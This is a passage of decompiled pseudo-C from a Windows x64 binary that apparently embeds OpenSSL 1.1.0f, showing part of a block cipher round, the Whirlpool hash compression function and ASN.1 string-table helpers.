    v35 = (v29 | v30[3]) ^ v25;
    v36 = (v34 | v30[1]) ^ v32;
    v37 = (((v35 >> 31) & (v30[2] >> 31)) + 2 * (v35 & v30[2])) ^ v29;
    v38 = dword_14011F910[(unsigned __int8)(v36 ^ v30[4]) + 256] ^ dword_14011F910[(v36 ^ (unsigned __int64)(unsigned int)v30[4]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v36 ^ v30[4]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v36 ^ v30[4]) >> 16) + 512];
    v39 = v38 ^ dword_14011F910[(unsigned __int8)(v34 ^ v30[5])] ^ dword_14011F910[((v34 ^ (unsigned __int64)(unsigned int)v30[5]) >> 24)
                                                                                 + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v34 ^ v30[5]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v34 ^ v30[5]) >> 16) + 768];
    v40 = v39 ^ v35;
    v41 = v39 ^ ((v38 >> 8) + (v38 << 24)) ^ v37;
    v42 = dword_14011F910[(unsigned __int8)(v40 ^ v30[6]) + 256] ^ dword_14011F910[(v40 ^ (unsigned __int64)(unsigned int)v30[6]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v40 ^ v30[6]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v40 ^ v30[6]) >> 16) + 512];
    v43 = v42 ^ dword_14011F910[(unsigned __int8)(v41 ^ v30[7])] ^ dword_14011F910[((v41 ^ (unsigned __int64)(unsigned int)v30[7]) >> 24)
                                                                                 + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v41 ^ v30[7]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v41 ^ v30[7]) >> 16) + 768];
    v44 = v43 ^ v36;
    v45 = v43 ^ ((v42 >> 8) + (v42 << 24)) ^ v34;
    v46 = dword_14011F910[(unsigned __int8)(v44 ^ v30[8]) + 256] ^ dword_14011F910[(v44 ^ (unsigned __int64)(unsigned int)v30[8]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v44 ^ v30[8]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v44 ^ v30[8]) >> 16) + 512];
    v47 = v46 ^ dword_14011F910[(unsigned __int8)(v45 ^ v30[9])] ^ dword_14011F910[((v45 ^ (unsigned __int64)(unsigned int)v30[9]) >> 24)
                                                                                 + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v45 ^ v30[9]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v45 ^ v30[9]) >> 16) + 768];
    v48 = v47 ^ v40;
    v49 = v47 ^ ((v46 >> 8) + (v46 << 24)) ^ v41;
    v50 = dword_14011F910[(unsigned __int8)(v48 ^ v30[10]) + 256] ^ dword_14011F910[(v48 ^ (unsigned __int64)(unsigned int)v30[10]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v48 ^ v30[10]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v48 ^ v30[10]) >> 16) + 512];
    v51 = v50 ^ dword_14011F910[(unsigned __int8)(v49 ^ v30[11])] ^ dword_14011F910[((v49 ^ (unsigned __int64)(unsigned int)v30[11]) >> 24)
                                                                                  + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v49 ^ v30[11]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v49 ^ v30[11]) >> 16) + 768];
    v52 = v51 ^ v44;
    v53 = v51 ^ ((v50 >> 8) + (v50 << 24)) ^ v45;
    v54 = dword_14011F910[(unsigned __int8)(v52 ^ v30[12]) + 256] ^ dword_14011F910[(v52 ^ (unsigned __int64)(unsigned int)v30[12]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v52 ^ v30[12]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v52 ^ v30[12]) >> 16) + 512];
    v55 = v54 ^ dword_14011F910[(unsigned __int8)(v53 ^ v30[13])] ^ dword_14011F910[((v53 ^ (unsigned __int64)(unsigned int)v30[13]) >> 24)
                                                                                  + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v53 ^ v30[13]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v53 ^ v30[13]) >> 16) + 768];
    v25 = v55 ^ v48;
    v29 = v55 ^ ((v54 >> 8) + (v54 << 24)) ^ v49;
    v56 = dword_14011F910[(unsigned __int8)(v25 ^ v30[14]) + 256] ^ dword_14011F910[(v25 ^ (unsigned __int64)(unsigned int)v30[14]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v25 ^ v30[14]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v25 ^ v30[14]) >> 16) + 512];
    v57 = v29 ^ (unsigned __int64)(unsigned int)v30[15];
    v58 = v29 ^ v30[15];
    v30 += 16;
    v59 = v56 ^ dword_14011F910[(unsigned __int8)v57] ^ dword_14011F910[(v57 >> 24) + 512] ^ dword_14011F910[BYTE1(v57) + 256] ^ dword_14011F910[BYTE2(v58) + 768];
    v32 = v59 ^ v52;
  }
  v60 = *v30 ^ v25;
  v61 = v30[2] ^ v32;
  v62 = v30[3] ^ i;
  v63 = v30[1] ^ v29;
  *a4 = HIBYTE(v60);
  a4[1] = BYTE2(v60);
  a4[2] = BYTE1(v60);
  a4[4] = HIBYTE(v63);
  a4[5] = BYTE2(v63);
  a4[6] = BYTE1(v63);
  a4[8] = HIBYTE(v61);
  a4[9] = BYTE2(v61);
  a4[10] = BYTE1(v61);
  a4[12] = HIBYTE(v62);
  a4[13] = BYTE2(v62);
  result = v62 >> 8;
  a4[3] = v60;
  a4[11] = v61;
  a4[15] = v62;
  a4[14] = BYTE1(v62);
  a4[7] = v63;
  return result;
}
// 14011F910: using guessed type _DWORD dword_14011F910[1036];

//----- (00000001400B6280) ----------------------------------------------------
__int64 __fastcall sub_1400B6280(__int64 *a1, __int64 a2, __int64 a3)
{
  unsigned __int64 v3; // r10
  __int64 v4; // rbx
  __int64 v5; // r9
  unsigned __int64 v6; // r14
  unsigned __int64 v7; // r15
  unsigned __int64 v8; // r12
  unsigned __int64 v9; // r13
  __int64 v10; // r11
  unsigned __int64 v11; // rsi
  __int64 v12; // rax
  unsigned __int64 v13; // rdi
  unsigned __int64 v14; // rcx
  int v15; // eax
  __int64 v16; // r8
  int v17; // eax
  __int64 v18; // r8
  int v19; // eax
  __int64 v20; // r8
  __int64 v21; // rax
  bool v22; // cc
  __int64 result; // rax
  bool v24; // zf
  __int64 v25; // [rsp+0h] [rbp-A9h]
  unsigned __int64 v26; // [rsp+8h] [rbp-A1h]
  __int64 v27; // [rsp+10h] [rbp-99h]
  __int64 v28; // [rsp+18h] [rbp-91h]
  __int64 v29; // [rsp+20h] [rbp-89h]
  __int64 v30; // [rsp+28h] [rbp-81h]
  __int64 v31; // [rsp+30h] [rbp-79h]
  __int64 v32; // [rsp+38h] [rbp-71h]
  __int64 v33; // [rsp+40h] [rbp-69h]
  __int64 v34; // [rsp+40h] [rbp-69h]
  __int64 v35; // [rsp+48h] [rbp-61h]
  __int64 v36; // [rsp+48h] [rbp-61h]
  __int64 v37; // [rsp+50h] [rbp-59h]
  __int64 v38; // [rsp+58h] [rbp-51h]
  __int64 v39; // [rsp+58h] [rbp-51h]
  __int64 v40; // [rsp+60h] [rbp-49h]
  unsigned __int64 v41; // [rsp+68h] [rbp-41h]
  _QWORD *v42; // [rsp+70h] [rbp-39h]
  __int64 v43; // [rsp+78h] [rbp-31h]
  __int64 v44; // [rsp+80h] [rbp-29h]
  __int64 v45; // [rsp+88h] [rbp-21h]
  unsigned __int8 v46; // [rsp+90h] [rbp-19h]
  _QWORD *v47; // [rsp+98h] [rbp-11h]
  char v48; // [rsp+A8h] [rbp-1h]
  unsigned __int64 v49; // [rsp+B0h] [rbp+7h]
  __int64 *v50; // [rsp+110h] [rbp+67h]
  unsigned __int64 v51; // [rsp+118h] [rbp+6Fh]
  __int64 v53; // [rsp+128h] [rbp+7Fh]
  __int64 v54; // [rsp+128h] [rbp+7Fh]

  v50 = a1;
  v3 = a2 + 16;
  v47 = (_QWORD *)(a2 + 16);
  do
  {
    v4 = *a1;
    v5 = a1[3];
    v6 = *(_QWORD *)(v3 + 8) ^ v5;
    v7 = *(_QWORD *)(v3 + 16) ^ a1[4];
    v43 = a1[4];
    v29 = v43;
    v44 = a1[5];
    v8 = *(_QWORD *)(v3 + 24) ^ v44;
    v30 = v44;
    v9 = *(_QWORD *)(v3 + 32) ^ a1[6];
    v49 = *a1 ^ *(_QWORD *)(v3 - 16);
    v51 = v49;
    v10 = a1[2];
    v45 = a1[6];
    v11 = *(_QWORD *)v3 ^ v10;
    v31 = v45;
    v12 = a1[7];
    v26 = a1[1];
    v13 = *(_QWORD *)(v3 - 8) ^ v26;
    v14 = *(_QWORD *)(v3 + 40) ^ v12;
    LOBYTE(v3) = v26;
    v25 = v4;
    v27 = v10;
    v28 = v5;
    v46 = v12;
    v32 = v12;
    v42 = &unk_140121940;
    do
    {
      v35 = *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE5(v27)] + 3) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE6(v26)]
                                                                                                + 2) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * HIBYTE(v25)] + 1) ^ WHIRLPOOL_Constants_140120940[2 * v46] ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE1(v31)] + 7) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE2(v30)] + 6) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE3(v29)] + 5) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE4(v28)] + 4);
      v4 = *v42 ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE1(v32)] + 7) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE2(v31)] + 6) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE3(v30)] + 5) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE4(v29)] + 4) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE5(v28)] + 3) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE6(v27)] + 2) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * HIBYTE(v26)] + 1) ^ WHIRLPOOL_Constants_140120940[2 * (unsigned __int8)v4];
      v3 = *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE2(v32)] + 6) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE3(v31)]
                                                                                               + 5) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE4(v30)] + 4) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE5(v29)] + 3) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE6(v28)] + 2) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE1(v25)] + 7) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * HIBYTE(v27)] + 1) ^ WHIRLPOOL_Constants_140120940[2 * (unsigned __int8)v3];
      v10 = *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE3(v32)] + 5) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE4(v31)]
                                                                                                + 4) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE5(v30)] + 3) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE6(v29)] + 2) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE1(v26)] + 7) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * HIBYTE(v28)] + 1) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE2(v25)] + 6) ^ WHIRLPOOL_Constants_140120940[2 * (unsigned __int8)v10];
      v38 = *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE4(v32)] + 4) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE5(v31)]
                                                                                                + 3) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE6(v30)] + 2) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE1(v27)] + 7) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * HIBYTE(v29)] + 1) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE2(v26)] + 6) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE3(v25)] + 5) ^ WHIRLPOOL_Constants_140120940[2 * (unsigned __int8)v5];
      v53 = *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE5(v32)] + 3) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE6(v31)]
                                                                                                + 2) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE1(v28)] + 7) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * HIBYTE(v30)] + 1) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE2(v27)] + 6) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE3(v26)] + 5) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE4(v25)] + 4) ^ WHIRLPOOL_Constants_140120940[2 * (unsigned __int8)v43];
      v33 = *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE6(v32)] + 2) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE1(v29)]
                                                                                                + 7) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * HIBYTE(v31)] + 1) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE2(v28)] + 6) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE3(v27)] + 5) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE4(v26)] + 4) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE5(v25)] + 3) ^ WHIRLPOOL_Constants_140120940[2 * (unsigned __int8)v44];
      v15 = BYTE6(v25);
      v25 = v4;
      v16 = *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * v15] + 2) ^ WHIRLPOOL_Constants_140120940[2 * (unsigned __int8)v45];
      v17 = BYTE5(v26);
      v26 = v3;
      v18 = *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * v17] + 3) ^ v16;
      v19 = BYTE4(v27);
      v27 = v10;
      v20 = *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE1(v30)] + 7) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * HIBYTE(v32)]
                                                                                                + 1) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE2(v29)] + 6) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE3(v28)] + 5) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * v19] + 4) ^ v18;
      v48 = v38;
      v28 = v38;
      LOBYTE(v43) = v53;
      v29 = v53;
      LOBYTE(v44) = v33;
      v30 = v33;
      v46 = v35;
      v32 = v35;
      LOBYTE(v45) = v20;
      v31 = v20;
      v36 = WHIRLPOOL_Constants_140120940[2 * (unsigned __int8)v14] ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * HIBYTE(v51)]
                                                                                + 1) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE6(v13)]
                                                                                                 + 2) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE5(v11)] + 3) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE4(v6)] + 4) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE3(v7)] + 5) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE2(v8)] + 6) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE1(v9)] + 7) ^ v35;
      v41 = WHIRLPOOL_Constants_140120940[2 * (unsigned __int8)v13] ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE1(v51)]
                                                                                + 7) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * HIBYTE(v11)]
                                                                                                 + 1) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE6(v6)] + 2) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE5(v7)] + 3) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE4(v8)] + 4) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE3(v9)] + 5) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE2(v14)] + 6) ^ v3;
      v37 = WHIRLPOOL_Constants_140120940[2 * (unsigned __int8)v11] ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE2(v51)]
                                                                                + 6) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE1(v13)]
                                                                                                 + 7) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * HIBYTE(v6)] + 1) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE6(v7)] + 2) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE5(v8)] + 3) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE4(v9)] + 4) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE3(v14)] + 5) ^ v10;
      v39 = WHIRLPOOL_Constants_140120940[2 * (unsigned __int8)v6] ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE3(v51)]
                                                                               + 5) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE2(v13)]
                                                                                                + 6) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE1(v11)] + 7) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * HIBYTE(v7)] + 1) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE6(v8)] + 2) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE5(v9)] + 3) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE4(v14)] + 4) ^ v38;
      v54 = WHIRLPOOL_Constants_140120940[2 * (unsigned __int8)v7] ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE4(v51)]
                                                                               + 4) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE3(v13)]
                                                                                                + 5) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE2(v11)] + 6) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE1(v6)] + 7) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * HIBYTE(v8)] + 1) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE6(v9)] + 2) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE5(v14)] + 3) ^ v53;
      v34 = WHIRLPOOL_Constants_140120940[2 * (unsigned __int8)v8] ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE5(v51)]
                                                                               + 3) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE4(v13)]
                                                                                                + 4) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE3(v11)] + 5) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE2(v6)] + 6) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE1(v7)] + 7) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * HIBYTE(v9)] + 1) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE6(v14)] + 2) ^ v33;
      v40 = WHIRLPOOL_Constants_140120940[2 * (unsigned __int8)v9] ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE6(v51)]
                                                                               + 2) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE5(v13)]
                                                                                                + 3) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE4(v11)] + 4) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE3(v6)] + 5) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE2(v7)] + 6) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE1(v8)] + 7) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * HIBYTE(v14)] + 1) ^ v20;
      v21 = v4 ^ WHIRLPOOL_Constants_140120940[2 * (unsigned __int8)v51] ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * HIBYTE(v13)]
                                                                                     + 1) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE6(v11)] + 2) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE5(v6)] + 3) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE4(v7)] + 4) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE3(v8)] + 5) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE2(v9)] + 6) ^ *(_QWORD *)((char *)&WHIRLPOOL_Constants_140120940[2 * BYTE1(v14)] + 7);
      v51 = v21;
      v13 = v41;
      v22 = (__int64)(v42 + 1) < (__int64)&unk_140121990;
      v14 = v36;
      v11 = v37;
      v6 = v39;
      v7 = v54;
      v8 = v34;
      v9 = v40;
      ++v42;
      LOBYTE(v5) = v48;
    }
    while ( v22 );
    a1 = v50;
    *v50 = v21 ^ v49;
    v50[1] ^= v41 ^ *(v47 - 1);
    v50[2] ^= *v47 ^ v37;
    v50[3] ^= v39 ^ v47[1];
    v50[4] ^= v54 ^ v47[2];
    v50[5] ^= v34 ^ v47[3];
    v50[6] ^= v40 ^ v47[4];
    v3 = (unsigned __int64)(v47 + 8);
    result = v36 ^ v50[7] ^ v47[5];
    v47 += 8;
    v24 = a3-- == 1;
    v50[7] = result;
  }
  while ( !v24 );
  return result;
}
// 140120940: using guessed type _QWORD WHIRLPOOL_Constants_140120940[1];

//----- (00000001400B6D30) ----------------------------------------------------
__int64 __fastcall sub_1400B6D30(int a1, int a2, int a3, int a4, int a5)
{
  _DWORD *v8; // rax

  v8 = (_DWORD *)sub_1400B6FB0(a1);
  if ( v8 )
  {
    if ( a2 >= 0 )
      v8[1] = a2;
    if ( a3 >= 0 )
      v8[2] = a3;
    if ( a4 )
      v8[3] = a4;
    if ( a5 )
      v8[4] = a5 | 1;
    return 1i64;
  }
  else
  {
    sub_140024610(13, 129, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_strnid.c", 231);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400B6DD0) ----------------------------------------------------
void sub_1400B6DD0()
{
  void *v0; // rcx

  v0 = (void *)qword_140143488;
  if ( qword_140143488 )
  {
    qword_140143488 = 0i64;
    sub_140029720(v0, (void (*)(void))sub_1400B6F80);
  }
}
// 140143488: using guessed type __int64 qword_140143488;

//----- (00000001400B6E10) ----------------------------------------------------
__int64 __fastcall sub_1400B6E10(int a1)
{
  int v1; // eax
  int v3[6]; // [rsp+30h] [rbp-28h] BYREF

  v3[0] = a1;
  if ( qword_140143488 && (v1 = sub_140029490((int *)qword_140143488, (__int64)v3), v1 >= 0) )
    return sub_140029880(qword_140143488, v1);
  else
    return sub_14002BCB0(
             (__int64)v3,
             (__int64)&unk_140121990,
             24,
             20,
             (__int64 (__fastcall *)(__int64, __int64))sub_140024C80);
}
// 140143488: using guessed type __int64 qword_140143488;

//----- (00000001400B6EB0) ----------------------------------------------------
__int64 __fastcall sub_1400B6EB0(__int64 *a1, char *a2, int a3, int a4, int a5)
{
  __int64 *v5; // rbx
  __int64 v9; // rax
  int v10; // ecx
  int v11; // eax
  __int64 v13; // [rsp+50h] [rbp+8h] BYREF

  v13 = 0i64;
  v5 = &v13;
  if ( a1 )
    v5 = a1;
  v9 = sub_1400B6E10(a5);
  if ( v9 )
  {
    v10 = *(_DWORD *)(v9 + 12);
    if ( (*(_BYTE *)(v9 + 16) & 2) == 0 )
      v10 &= dword_14013D180;
    v11 = sub_1400AB090((_DWORD **)v5, a2, a3, a4, v10, *(_DWORD *)(v9 + 4), *(_DWORD *)(v9 + 8));
  }
  else
  {
    v11 = sub_1400AB060((_DWORD **)v5, a2, a3, a4, dword_14013D180 & 0x2806);
  }
  if ( v11 > 0 )
    return *v5;
  else
    return 0i64;
}
// 14013D180: using guessed type int dword_14013D180;

//----- (00000001400B6F80) ----------------------------------------------------
void __fastcall sub_1400B6F80(_BYTE *a1)
{
  if ( (a1[16] & 1) != 0 )
    sub_14001D930(a1);
}

//----- (00000001400B6FB0) ----------------------------------------------------
__int64 __fastcall sub_1400B6FB0(int a1)
{
  __int64 result; // rax
  _DWORD *v3; // rdi
  _DWORD *v4; // rax
  _DWORD *v5; // rbx

  if ( qword_140143488 || (result = (__int64)sub_140029630((__int64)sub_140020A60), (qword_140143488 = result) != 0) )
  {
    result = sub_1400B6E10(a1);
    v3 = (_DWORD *)result;
    if ( !result || (*(_BYTE *)(result + 16) & 1) == 0 )
    {
      v4 = sub_14001DC20(0x14ui64);
      v5 = v4;
      if ( !v4 )
        return 0i64;
      if ( !(unsigned int)sub_1400297C0((int *)qword_140143488, (__int64)v4) )
      {
        sub_14001D930(v5);
        return 0i64;
      }
      if ( v3 )
      {
        *v5 = *v3;
        v5[1] = v3[1];
        v5[2] = v3[2];
        v5[3] = v3[3];
        v5[4] = v3[4] | 1;
        return (__int64)v5;
      }
      else
      {
        *(_QWORD *)(v5 + 1) = -1i64;
        result = (__int64)v5;
        v5[4] = 1;
      }
    }
  }
  return result;
}
// 140143488: using guessed type __int64 qword_140143488;

//----- (00000001400B70B0) ----------------------------------------------------
unsigned int *__fastcall sub_1400B70B0(const char *a1, __int64 a2)
{
  unsigned int *result; // rax
  unsigned int *v3; // rbx
  int v4; // [rsp+50h] [rbp+18h] BYREF

  v4 = 0;
  result = sub_1400B7D00(a1, a2, 0, &v4);
  v3 = result;
  if ( v4 )
  {
    sub_140024610(13, 178, v4, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 94);
    return v3;
  }
  return result;
}

//----- (00000001400B7110) ----------------------------------------------------
__int64 __fastcall sub_1400B7110(const char *a1, _DWORD *a2)
{
  int v2; // eax

  *a2 = 0;
  return sub_14002EEA0(
           a1,
           v2 + 68,
           v2 - 55,
           (__int64 (__fastcall *)(const char *, __int64, __int64))sub_1400B8010,
           (__int64)a2);
}
// 1400B7133: variable 'v2' is possibly undefined

//----- (00000001400B7140) ----------------------------------------------------
__int64 __fastcall sub_1400B7140(int *a1, int a2, int a3, int a4, int a5, int a6)
{
  int v6; // eax
  int v7; // r11d
  __int64 result; // rax
  __int64 v10; // rdx

  v7 = *a1;
  if ( *a1 == -1 || a6 )
  {
    v10 = a1[106];
    if ( (_DWORD)v10 == 20 )
    {
      sub_140024610(13, 176, 174, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 477);
      return 0i64;
    }
    else
    {
      a1[106] = v10 + 1;
      if ( v7 == -1 )
      {
        a1[5 * v10 + 6] = a2;
        a1[5 * v10 + 7] = a3;
      }
      else
      {
        a1[5 * v10 + 6] = v7;
        a1[5 * v10 + 7] = a1[1];
        *(_QWORD *)a1 = -1i64;
      }
      a1[5 * v10 + 9] = a5;
      result = 1i64;
      a1[5 * v10 + 8] = a4;
    }
  }
  else
  {
    sub_140024610(v6 - 35, 176, 179, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 472);
    return 0i64;
  }
  return result;
}
// 1400B7178: variable 'v6' is possibly undefined

//----- (00000001400B7210) ----------------------------------------------------
__int64 __fastcall sub_1400B7210(const char *a1, int a2, __int64 a3)
{
  int v4; // edi
  int v6; // r14d
  const char *v7; // rsi
  int v8; // ecx
  const char *v9; // rax
  int v10; // eax
  int v12; // r8d
  int v13; // edx
  int v14; // r9d
  int v15; // eax
  int v16; // [rsp+28h] [rbp-30h]
  int v17; // [rsp+60h] [rbp+8h] BYREF
  signed int v18; // [rsp+70h] [rbp+18h] BYREF

  v4 = a2;
  v6 = 0;
  v7 = 0i64;
